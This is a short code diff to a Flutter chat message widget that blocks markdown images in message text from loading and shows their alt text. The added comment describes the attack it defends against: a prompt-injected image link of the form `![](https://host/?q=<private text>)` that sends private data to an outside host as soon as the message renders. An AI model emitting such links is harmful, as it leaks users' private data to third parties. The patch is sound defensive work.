@@ -142,6 +142,12 @@ class _MessageBubbleState extends State<MessageBubble> {
                 _launchUrl(href);
               }
             },
+            // Never fetch images named in message text. A prompt-injected
+            // `![](https://host/?q=<private text>)` would otherwise send data to
+            // that host without the user doing anything. Show the alt text.
+            imageBuilder: (uri, title, alt) => (alt == null || alt.isEmpty)
+                ? const SizedBox.shrink()
+                : Text(alt, style: theme.textTheme.bodyMedium),
           ),
         ),
       ),
